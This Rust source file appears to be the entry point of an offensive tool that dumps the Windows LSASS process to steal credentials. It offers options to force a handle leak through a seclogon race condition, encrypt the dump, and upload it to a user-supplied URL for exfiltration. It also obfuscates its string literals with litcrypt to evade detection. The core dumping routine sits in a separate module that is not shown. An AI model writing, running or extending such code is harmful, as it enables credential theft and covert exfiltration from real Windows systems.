#[macro_use]
extern crate litcrypt2;
use_litcrypt!();

extern crate getopts;
use std::{env};
use getopts::Options;

fn main() {

    start();
}

fn print_usage(program: &str, opts: Options) {
    let brief = format!("Usage: {} --dump|--decrypt [options]", program);
    print!("{}", opts.usage(&brief));
}

fn start() {

    let mut force = false;
    let mut upload = "".to_string();
    let mut key = lc!("1234abcd");
    let mut output = lc!("c:\\temp\\output.txt");
    let mut input = lc!("c:\\temp\\input.txt");

    let args: Vec<String> = env::args().collect();
    let program = args[0].clone();
    let mut opts = Options::new();
    opts.optflag("h", "help", "Print this help menu.");
    opts.optflag("", "dump", "Dump lsass.");
    opts.optflag("", "decrypt", "Decrypt a previously generated dump file.");
    opts.optflag("f", "force", "Force seclogon's service to leak a lsass handle through a race condition.");
    opts.optopt("k", "key", "Encryption key [default: 1234abcd]", "");
    opts.optopt("i", "input", r"Encrypted dump file [default: c:\temp\input.txt]", "");
    opts.optopt("o", "output", r"Destination path [default: c:\temp\output.txt]", "");
    opts.optopt("u", "upload", "Upload URL", "");


    let matches = match opts.parse(&args[1..]) {
        Ok(m) => { m }
        Err(_) => {print!("{}",lc!("[x] Invalid arguments. Use -h for detailed help.")); return; }
    };

    if matches.opt_present("h") {
        print_usage(&program, opts);
        return;
    }

    if matches.opt_present(&lc!("dump"))
    {

        if matches.opt_present("u")
        {
            upload = matches.opt_str("u").unwrap();
        }
        if matches.opt_present("f")
        {
            force = true;
        }
        if matches.opt_present("k")
        {
            key = matches.opt_str("k").unwrap();
        }
        
        dumper::dump(&key, &upload, force);

    }
    else if matches.opt_present(&lc!("decrypt"))
    {

        if matches.opt_present("i")
        {
            input = matches.opt_str("i").unwrap();

        }
        if matches.opt_present("o")
        {
            output = matches.opt_str("o").unwrap();
        }
        if matches.opt_present("k")
        {
            key = matches.opt_str("k").unwrap();
        }
        
        dumper::decrypt(&input, &key, &output);

    }
    else
    {
        print!("{}",lc!("[x] Invalid arguments. Use -h for detailed help."));
    }

}
